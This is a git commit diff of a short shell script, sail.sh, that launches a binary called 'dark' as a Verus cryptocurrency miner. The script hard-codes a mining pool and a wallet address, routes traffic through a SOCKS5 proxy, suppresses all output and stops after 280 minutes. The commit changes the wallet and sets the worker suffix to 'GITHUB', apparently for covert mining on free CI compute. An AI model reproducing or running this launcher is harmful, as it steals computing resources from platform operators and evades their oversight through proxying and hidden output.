4399045ff2f2ac1a8c0a7d6211c8875af7531a56
LiangSuao <88931187+LiangSuao@users.noreply.github.com>
2021-08-14 18:26:27 +0700

    Update and rename yyy.sh to sail.sh

--- sail.sh
+++ sail.sh
@@ -4,8 +4,8 @@ sudo apt install screen libjansson4 -y
 chmod +x dark
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
-WALLET=aPVG6oYboudnE31PwkPLi94pbc5CaVj21N
+WALLET=DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
 PROXY=socks5://192.252.209.155:14455
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-DRAGONC)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GITHUB)
 timeout 280m ./dark -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
 echo Sukses
